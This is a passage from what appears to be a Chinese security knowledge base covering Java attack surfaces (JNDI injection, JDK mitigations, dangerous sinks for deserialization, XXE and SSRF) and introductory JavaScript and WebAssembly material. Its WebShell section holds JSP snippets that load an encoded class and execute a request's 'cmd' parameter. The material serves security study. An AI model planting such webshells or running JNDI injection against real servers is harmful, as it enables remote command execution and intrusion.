<p>T3协议是用于在WebLogic服务器和其他类型的Java程序之间传输信息的协议，是Weblogic对RMI规范的实现。简单来说，可以把T3视为暴露JDNI给用户调用的接口。</p>
</div>
<div class="section" id="jrmp">
<h5>JRMP<a class="headerlink" href="#jrmp" title="永久链接至标题">¶</a></h5>
<p>Java远程方法协议(Java Remote Method Protocol，JRMP)是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用(RMI)之下、TCP/IP之上的线路层协议。</p>
<p>JRMP是一个Java特有的、适用于Java之间远程调用的基于流的协议，要求客户端和服务器上都使用Java对象。</p>
</div>
</div>
<span id="document-language/java/jndi"></span><div class="section" id="jndi">
<h4>JNDI<a class="headerlink" href="#jndi" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)是为Java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如RMI、CORBA、LDAP、DNS等。</p>
<p>其中Naming Service类似于哈希表的K/V对，通过名称去获取对应的服务。Directory Service是一种特殊的Naming Service，用类似目录的方式来存取服务。</p>
<p><img alt="jndiarch" src="images/jndiarch.gif" /></p>
</div>
<div class="section" id="id2">
<h5>JNDI注入<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>JNDI注入是2016年由pentester在BlackHat USA上的 <code class="docutils literal notranslate"><span class="pre">A</span> <span class="pre">Journey</span> <span class="pre">From</span> <span class="pre">JNDI</span> <span class="pre">LDAP</span> <span class="pre">Manipulation</span> <span class="pre">To</span> <span class="pre">RCE</span></code> 议题提出的。</p>
<p>其攻击过程如下</p>
<ol class="arabic simple">
<li>攻击者将Payload绑定到攻击者的命名/目录服务中</li>
<li>攻击者将绝对URL注入易受攻击的JNDI查找方法</li>
<li>应用程序执行查找</li>
<li>应用程序连接到攻击者控制的JNDI服务并返回Payload</li>
<li>应用程序解码响应并触发有效负载</li>
</ol>
</div>
<div class="section" id="id3">
<h5>攻击载荷<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>JDNI主要有几种攻击载荷：</p>
<ul class="simple">
<li>CORBA</li>
<li>IOR</li>
<li>JNDI Reference</li>
<li>JNDI Reference</li>
<li>LDAP</li>
<li>Remote Location</li>
<li>Remote Object</li>
<li>RMI</li>
<li>Serialized Object</li>
</ul>
<div class="section" id="rmi-remote-object">
<h6>RMI Remote Object<a class="headerlink" href="#rmi-remote-object" title="永久链接至标题">¶</a></h6>
<p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，将编译后的RMI远程对象类放在HTTP/FTP/SMB等服务器上。其中Codebase地址由远程服务器的 <code class="docutils literal notranslate"><span class="pre">java.rmi.server.codebase</span></code> 属性设置，供受害者的RMI客户端远程加载。</p>
<p>利用条件如下：</p>
<ul class="simple">
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 <code class="docutils literal notranslate"><span class="pre">java.rmi.server.useCodebaseOnly</span></code> 的值为false。</li>
</ul>
<p>其中JDK 6u45、7u21后，<code class="docutils literal notranslate"><span class="pre">java.rmi.server.useCodebaseOnly</span></code> 的值默认为true。</p>
</div>
<div class="section" id="rmi-jndi-reference">
<h6>RMI + JNDI Reference<a class="headerlink" href="#rmi-jndi-reference" title="永久链接至标题">¶</a></h6>
<p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去攻击者指定的远程地址加载Factory类。这种方式原理上并非使用RMI Class Loading机制，因此不受 <code class="docutils literal notranslate"><span class="pre">java.rmi.server.useCodebaseOnly</span></code> 系统属性的限制。但是在JDK 6u132, JDK 7u122, JDK 8u113 后限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 <code class="docutils literal notranslate"><span class="pre">com.sun.jndi.rmi.object.trustURLCodebase</span></code> 、 <code class="docutils literal notranslate"><span class="pre">com.sun.jndi.cosnaming.object.trustURLCodebase</span></code> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p>
</div>
<div class="section" id="ldap-jndi-reference">
<h6>LDAP + JNDI Reference<a class="headerlink" href="#ldap-jndi-reference" title="永久链接至标题">¶</a></h6>
<p>Java的LDAP可以在属性值中存储特定的Java对象，且LDAP服务的Reference远程加载Factory类不受 <code class="docutils literal notranslate"><span class="pre">com.sun.jndi.rmi.object.trustURLCodebase</span></code> 、<code class="docutils literal notranslate"><span class="pre">com.sun.jndi.cosnaming.object.trustURLCodebase</span></code> 等属性的限制，适用范围更广。</p>
</div>
</div>
</div>
<span id="document-language/java/jdk"></span><div class="section" id="jdk">
<h4>JDK<a class="headerlink" href="#jdk" title="永久链接至标题">¶</a></h4>
<div class="section" id="jdk-6">
<h5>JDK 6<a class="headerlink" href="#jdk-6" title="永久链接至标题">¶</a></h5>
<div class="section" id="u45">
<h6>6u45<a class="headerlink" href="#u45" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件</li>
</ul>
</div>
<div class="section" id="u141">
<h6>6u141<a class="headerlink" href="#u141" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">com.sun.jndi.rmi.object.trustURLCodebase</span></code> 默认为false</li>
<li><code class="docutils literal notranslate"><span class="pre">com.sun.jndi.cosnaming.object.trustURLCodebase</span></code> 默认为false</li>
</ul>
</div>
<div class="section" id="u211">
<h6>6u211<a class="headerlink" href="#u211" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>LDAP远程Reference代码默认不信任，影响LDAP远程Reference代码攻击方式</li>
</ul>
</div>
</div>
<div class="section" id="jdk-7">
<h5>JDK 7<a class="headerlink" href="#jdk-7" title="永久链接至标题">¶</a></h5>
<div class="section" id="u40">
<h6>7u40<a class="headerlink" href="#u40" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">java.io.File</span></code> 类中添加了 <code class="docutils literal notranslate"><span class="pre">isInvalid</span></code> 方法，检测文件名中是否包含空字节</li>
</ul>
</div>
<div class="section" id="u122">
<h6>7u122<a class="headerlink" href="#u122" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">com.sun.jndi.rmi.object.trustURLCodebase</span></code> 默认为false</li>
<li><code class="docutils literal notranslate"><span class="pre">com.sun.jndi.cosnaming.object.trustURLCodebase</span></code> 默认为false</li>
</ul>
</div>
<div class="section" id="u201">
<h6>7u201<a class="headerlink" href="#u201" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>LDAP远程Reference代码默认不信任，影响LDAP远程Reference代码攻击方式</li>
</ul>
</div>
</div>
<div class="section" id="jdk-8">
<h5>JDK 8<a class="headerlink" href="#jdk-8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">sun.net.www.protocol</span></code> 不再支持gopher协议</li>
</ul>
<div class="section" id="u113">
<h6>8u113<a class="headerlink" href="#u113" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">com.sun.jndi.rmi.object.trustURLCodebase</span></code> 默认为false</li>
<li><code class="docutils literal notranslate"><span class="pre">com.sun.jndi.cosnaming.object.trustURLCodebase</span></code> 默认为false</li>
</ul>
</div>
<div class="section" id="u121">
<h6>8u121<a class="headerlink" href="#u121" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>RMI加入了反序列化白名单机制</li>
<li>RMI远程Reference代码默认不信任，影响RMI远程Reference代码攻击方式</li>
</ul>
</div>
<div class="section" id="u191">
<h6>8u191<a class="headerlink" href="#u191" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>LDAP远程Reference代码默认不信任，影响LDAP远程Reference代码攻击方式</li>
</ul>
</div>
<div class="section" id="u251">
<h6>8u251<a class="headerlink" href="#u251" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除</li>
</ul>
</div>
</div>
</div>
<span id="document-language/java/sink"></span><div class="section" id="sink">
<h4>常见Sink<a class="headerlink" href="#sink" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>命令执行/注入<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>java.lang.Runtime.getRuntime().exec()</li>
<li>java.lang.ProcessBuilder</li>
</ul>
</div>
<div class="section" id="xxe">
<h5>XXE<a class="headerlink" href="#xxe" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>java.net.bull.javamelody.PayloadNameRequestWrapper</li>
<li>javax.xml.bind.Unmarshaller</li>
<li>javax.xml.parsers.DocumentBuilderFactory</li>
<li>javax.xml.parsers.SAXParser</li>
<li>javax.xml.stream.XMLStreamReader</li>
<li>javax.xml.transform.sax.SAXSource</li>
<li>javax.xml.transform.sax.SAXTransformerFactory</li>
<li>javax.xml.transform.TransformerFactory</li>
<li>javax.xml.validation.SchemaFactory</li>
<li>javax.xml.validation.Validator</li>
<li>javax.xml.xpath.XpathExpression</li>
<li>org.apache.commons.digester3.Digester</li>
<li>org.apache.ofbiz.base.util.UtilXml</li>
<li>org.dom4j.io.SAXReader</li>
<li>org.jdom.input.SAXBuilder</li>
<li>org.jdom2.input.SAXBuilder</li>
<li>org.xml.sax.helpers.XMLReaderFactory</li>
<li>org.xml.sax.XMLReader</li>
</ul>
</div>
<div class="section" id="ssrf">
<h5>SSRF<a class="headerlink" href="#ssrf" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>HttpClient.execute</li>
<li>HttpClients.execute</li>
<li>HttpURLConnection.getInputStream</li>
<li>ImageIO.read</li>
<li>OkHttpClient.newCall.execute</li>
<li>Request.Get.execute</li>
<li>Request.Post.execute</li>
<li>URL.openStream</li>
<li>URLConnection.getInputStream</li>
</ul>
</div>
<div class="section" id="id2">
<h5>反序列化<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<div class="section" id="id3">
<h6>相关Sink函数<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">JSON.parseObject</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ObjectInputStream.readObject</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ObjectInputStream.readUnshared</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ObjectMapper.readValue</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">XMLDecoder.readObject</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">XStream.fromXML</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Yaml.load</span></code></li>
</ul>
</div>
<div class="section" id="magic-call">
<h6>Magic Call<a class="headerlink" href="#magic-call" title="永久链接至标题">¶</a></h6>
<p>以下的魔术方法都会在反序列化过程中被自动的调用。</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">readObject</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">readExternal</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">readResolve</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">readObjectNoData</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">validateObject</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">finalize</span></code></li>
</ul>
</div>
<div class="section" id="json">
<h6>主流JSON库<a class="headerlink" href="#json" title="永久链接至标题">¶</a></h6>
<p>主流的JSON库有Gson、Jackson、Fastjson等，因为JSON常在反序列化中使用，所以相关库都有较大的影响。</p>
<p>其中Gson默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。</p>
<p>Jackson除非指明&#64;jsonAutoDetect，Jackson不会反序列化非public属性。在防御时，可以不使用enableDefaultTyping方法。相关CVE有CVE-2017-7525、CVE-2017-15095。</p>
<p>FastJson是阿里巴巴的开源JSON解析库，支持将Java Bean序列化为JSON字符串，也支持从JSON字符串反序列化到Java Bean，相关CVE有CVE-2017-18349等。</p>
<p>FastJson常见的Sink点有：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">JSON.toJSONString</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">JSON.parseObject</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">JSON.parse</span></code></li>
</ul>
</div>
</div>
</div>
<span id="document-language/java/webshell"></span><div class="section" id="webshell">
<h4>WebShell<a class="headerlink" href="#webshell" title="永久链接至标题">¶</a></h4>
<div class="section" id="bcel">
<h5>BCEL字节码<a class="headerlink" href="#bcel" title="永久链接至标题">¶</a></h5>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">bcelCode</span> <span class="o">=</span> <span class="s2">&quot;...&quot;</span><span class="p">;</span>
<span class="n">response</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">()</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">String</span><span class="o">.</span><span class="n">valueOf</span><span class="p">(</span><span class="n">new</span> <span class="n">ClassLoader</span><span class="p">()</span><span class="o">.</span><span class="n">loadClass</span><span class="p">(</span><span class="n">bcelCode</span><span class="p">)</span><span class="o">.</span><span class="n">getConstructor</span><span class="p">(</span><span class="n">String</span><span class="o">.</span><span class="n">class</span><span class="p">)</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">toString</span><span class="p">())</span><span class="o">.</span><span class="n">getBytes</span><span class="p">());</span>
</pre></div>
</div>
</div>
<div class="section" id="id1">
<h5>自定义类加载器<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span>response.getOutputStream().write(new ClassLoader() {
    @Override
    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException {
        if (name.contains(&quot;shell&quot;)) {
            return findClass(name);
        }
        return super.loadClass(name);
    }

    @Override
    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
        try {
            byte[] bytes = Base64.getDecoder().decode(&quot;...&quot;);
            PermissionCollection pc = new Permissions();
            pc.add(new AllPermission());
            ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
            return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return super.findClass(name);
    }
}.loadClass(&quot;shell&quot;).getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString().getBytes());
%&gt;
</pre></div>
</div>
</div>
<div class="section" id="id2">
<h5>执行命令变式<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>java.lang.ProcessBuilder#start</li>
<li>java.lang.Runtime#exec</li>
<li>TemplatesImpl</li>
</ul>
</div>
<div class="section" id="id3">
<h5>基于反射<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>class.forName</li>
<li>MethodAccessor.invoke</li>
<li>Method.invoke</li>
</ul>
</div>
<div class="section" id="shell">
<h5>其他Shell变式<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>java.beans.Expression</li>
<li>java.lang.ClassLoader</li>
<li>java.net.URLClassLoader</li>
<li>jdk.nashorn.internal.runtime.ScriptLoader</li>
<li>ObjectInputStream.resolveClass</li>
<li>ScriptEngine.eval</li>
<li>ScriptEngineManager</li>
<li>ToolProvider.getSystemJavaCompiler</li>
</ul>
</div>
<div class="section" id="tomcat">
<h5>Tomcat 容器<a class="headerlink" href="#tomcat" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Servlet</li>
<li>Filter</li>
<li>Listener</li>
</ul>
</div>
</div>
<span id="document-language/java/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>官方文档<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://commons.apache.org/proper/commons-ognl/">ognl</a></li>
<li><a class="reference external" href="https://docs.oracle.com/javase/9/security/toc.htm">Java SE Security Guide</a></li>
<li><a class="reference external" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html">Java RMI Release Notes for JDK 6</a></li>
<li><a class="reference external" href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">Java Release Notes for JDK 7</a></li>
</ul>
</div>
<div class="section" id="id3">
<h5>机制说明<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.cnblogs.com/czwbig/p/11127222.html">深入理解Java类加载</a></li>
</ul>
</div>
<div class="section" id="id4">
<h5>反序列化<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<div class="section" id="id5">
<h6>标准<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><a class="reference external" href="https://blog.csdn.net/silentbalanceyh/article/details/8183849">Java序列化【草案一】</a></li>
<li><a class="reference external" href="https://docs.oracle.com/en/java/javase/14/docs/specs/serialization/index.html">Java 14 Object Serialization Specification</a></li>
</ul>
</div>
<div class="section" id="id7">
<h6>利用与技巧<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><a class="reference external" href="https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles">Marshalling Pickles how deserializing objects can ruin your day</a></li>
<li><a class="reference external" href="https://frohoff.github.io/appseccali-marshalling-pickles/">AppSecCali 2015: Marshalling Pickles</a></li>
<li><a class="reference external" href="http://wouter.coekaerts.be/2015/annotationinvocationhandler">More serialization hacks with AnnotationInvocationHandler</a></li>
<li><a class="reference external" href="https://github.com/pwntester/JRE8u20_RCE_Gadget">Pure JRE 8 RCE Deserialization gadget</a></li>
<li><a class="reference external" href="http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html">Breaking Defensive Serialization</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/nNTw3HMnkX63d9ybdx3USQ">Java反序列化漏洞从入门到深入</a></li>
<li><a class="reference external" href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/">Java反序列化漏洞通用利用分析</a></li>
<li><a class="reference external" href="http://www.freebuf.com/vuls/176672.html">JRE8u20反序列化漏洞分析</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/3847">浅析Java序列化和反序列化</a></li>
<li><a class="reference external" href="https://security.tencent.com/index.php/blog/msg/97">Commons Collections Java反序列化漏洞深入分析</a></li>
<li><a class="reference external" href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">FAR SIDES OF JAVA REMOTE PROTOCOLS</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA">JDK8u20反序列化漏洞新型PoC思路及具体实现</a></li>
<li><a class="reference external" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a></li>
</ul>
</div>
<div class="section" id="id11">
<h6>框架<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><a class="reference external" href="https://www.freebuf.com/articles/web/169770.html">WebLogic反序列化漏洞漫谈</a></li>
<li><a class="reference external" href="https://cert.360.cn/report/detail?id=c8eed4b36fe8b19c585a1817b5f10b9e">从WebLogic看反序列化漏洞的利用与防御</a></li>
<li><a class="reference external" href="https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf">JSON反序列化之殇</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/j_gx9C_xL1LyrnuFFPFsfg">Shiro组件漏洞与攻击链分析</a></li>
<li><a class="reference external" href="https://www.infoq.com/articles/apache-shiro/">Application Security With Apache Shiro</a></li>
<li><a class="reference external" href="https://zhuanlan.zhihu.com/p/54176956">Shiro安全框架【快速入门】</a></li>
<li><a class="reference external" href="https://cloud.tencent.com/developer/article/1367702">Shiro 实战(四) - 过滤器机制</a></li>
</ul>
</div>
</div>
<div class="section" id="id15">
<h5>沙箱<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://phrack.org/papers/escaping_the_java_sandbox.html">Java Sandbox Escape</a></li>
</ul>
</div>
<div class="section" id="id16">
<h5>框架<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/apache/struts">Struts</a></li>
<li><a class="reference external" href="https://github.com/apache/struts-examples">Struts Examples</a></li>
<li><a class="reference external" href="https://github.com/eclipse/jetty.project">Eclipse Jetty</a></li>
<li><a class="reference external" href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a> SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist</li>
</ul>
<div class="section" id="id17">
<h6>框架利用技巧<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><a class="reference external" href="https://landgrey.me/blog/22/">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></li>
</ul>
</div>
</div>
<div class="section" id="rmi">
<h5>RMI<a class="headerlink" href="#rmi" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.cnblogs.com/ygj0930/p/6542811.html">Java RMI与RPC的区别</a></li>
<li><a class="reference external" href="https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html">Remote Method Invocation (RMI)</a></li>
<li><a class="reference external" href="https://paper.seebug.org/1091">Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS那些事儿</a></li>
<li><a class="reference external" href="http://docs.oracle.com/cd/E11035_01/wls100/client/t3.html">Oracle: Developing T3 Clients</a></li>
</ul>
</div>
<div class="section" id="jndi">
<h5>JNDI<a class="headerlink" href="#jndi" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">Overview of JNDI</a></li>
<li><a class="reference external" href="https://paper.seebug.org/417/">关于 JNDI 注入</a></li>
<li><a class="reference external" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">A Journey From JNDI LDAP Manipulation To RCE</a></li>
<li><a class="reference external" href="https://www.freebuf.com/column/207439.html">如何绕过高版本JDK的限制进行JNDI注入</a></li>
</ul>
</div>
<div class="section" id="webshell">
<h5>WebShell<a class="headerlink" href="#webshell" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://xz.aliyun.com/t/7798">各种姿势jsp webshell</a></li>
</ul>
</div>
<div class="section" id="id19">
<h5>其他漏洞<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="blog.spoock.com/2018/10/23/java-xxe/index.html">JAVA常见的XXE漏洞写法和防御</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-language/javascript/index"></span><div class="section" id="javascript">
<h3>JavaScript<a class="headerlink" href="#javascript" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-language/javascript/ECMAScript"></span><div class="section" id="ecmascript">
<h4>ECMAScript<a class="headerlink" href="#ecmascript" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>ECMAScript是一种由ECMA国际通过ECMA-262标准化的脚本程序设计语言，它往往被称为JavaScript或JScript。简单的，可以认为ECMAScript是JavaScript的一个标准，但实际上后两者是ECMA-262标准的实现和扩展。</p>
</div>
<div class="section" id="id2">
<h5>版本<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>1997年6月，首版发布。1998年6月，进行了格式修正，以使得其形式与ISO/IEC16262国际标准一致。1999年12月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第4版本被放弃，其中的部分成为了第5版本及Harmony的基础。</p>
<p>2009年12月，第五版发布，新增“严格模式（strict mode）”，澄清了许多第3版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如getters及setters，支持JSON以及在对象属性上更完整的反射。</p>
<p>2015年6月，第6版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。</p>
<p>2016年6月，ECMAScript 2016（ES2016）发布，引入 <code class="docutils literal notranslate"><span class="pre">Array.prototype.includes</span></code> 、指数运算符、SIMD等新特性。</p>
<p>2017年6月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。</p>
<p>2018年6月，ECMAScript 2018 （ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法。</p>
</div>
<div class="section" id="es6">
<h5>ES6 特性<a class="headerlink" href="#es6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">const</span></code> / <code class="docutils literal notranslate"><span class="pre">let</span></code></li>
<li>模板字面量</li>
<li><dl class="first docutils">
<dt>解构</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">[a,</span> <span class="pre">b]</span> <span class="pre">=</span> <span class="pre">[10,</span> <span class="pre">20]</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>对象字面量简写法</li>
<li><code class="docutils literal notranslate"><span class="pre">for...of</span></code> 循环</li>
<li><code class="docutils literal notranslate"><span class="pre">...xxx</span></code> 展开运算符</li>
<li>可变参数</li>
<li>箭头函数</li>
<li>默认参数函数</li>
<li>默认值与解构</li>
<li>类</li>
</ul>
</div>
</div>
<span id="document-language/javascript/engine"></span><div class="section" id="id1">
<h4>引擎<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="v8">
<h5>V8<a class="headerlink" href="#v8" title="永久链接至标题">¶</a></h5>
<p>V8是Chrome的JavaScript语言处理程序（VM）。其引擎由TurboFan、Ignition和Liftoff组成。其中Turbofan是其优化编译器，Ignition则是其解释器，Liftoff是WebAssembly的代码生成器。</p>
</div>
<div class="section" id="spidermonkey">
<h5>SpiderMonkey<a class="headerlink" href="#spidermonkey" title="永久链接至标题">¶</a></h5>
<p>SpiderMonkey是Mozilla项目的一部分，是一个用 C/C++ 实现的JavaScript脚本引擎。</p>
</div>
<div class="section" id="javascriptcore">
<h5>JavaScriptCore<a class="headerlink" href="#javascriptcore" title="永久链接至标题">¶</a></h5>
<p>JavaScriptCore的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt是最开始的解释执行部分，Baseline是暂时的JIT，DFG阶段开始做一定的优化，FTL阶段做了充分的优化。</p>
</div>
<div class="section" id="chakracore">
<h5>ChakraCore<a class="headerlink" href="#chakracore" title="永久链接至标题">¶</a></h5>
<p>ChakraCore是一个完整的JavaScript虚拟机，由微软实现，用于Edge浏览器以及IE的后期版本中。</p>
</div>
<div class="section" id="jscript">
<h5>JScript<a class="headerlink" href="#jscript" title="永久链接至标题">¶</a></h5>
<p>JScript是由微软开发的脚本语言，是微软对ECMAScript规范的实现，用于IE的早期版本中。</p>
</div>
<div class="section" id="jerryscript">
<h5>JerryScript<a class="headerlink" href="#jerryscript" title="永久链接至标题">¶</a></h5>
<p>JerryScript是一个适用于嵌入式设备的小型JavaScript引擎，由三星开发并维护。</p>
</div>
</div>
<span id="document-language/javascript/wasm"></span><div class="section" id="webassembly">
<h4>WebAssembly<a class="headerlink" href="#webassembly" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>简而言之，WASM是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统JavaScript更有效地执行。</p>
</div>
<div class="section" id="id2">
<h5>执行<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>虽然浏览器可能以不同的方式来实现Wasm支持，但是使用的沙盒环境通常是JavaScript沙箱。</p>
<p>在浏览器中运行时，Wasm应用程序需要将其代码定义为单独的文件或JavaScript块内的字节数组。 然后使用JavaScript实例化文件或代码块，目前不能在没有JavaScript包装器的情况下直接在页面中调用Wasm。</p>
<p>虽然Wasm可以用C / C++等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当Wasm应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。</p>
<p>Wasm中的内存是线性的，它在Wasm应用程序和JavaScript之间共享。 当Wasm函数将字符串返回给JavaScript时，它实际上返回一个指向Wasm应用程序内存空间内位置的指针。 Wasm应用程序本身只能访问分配给它的JavaScript内存部分，而不是整个内存空间。</p>
</div>
<div class="section" id="id3">
<h5>安全<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>Wasm的设计从如下几个方面考虑来保证Wasm的安全性</p>
<ul class="simple">
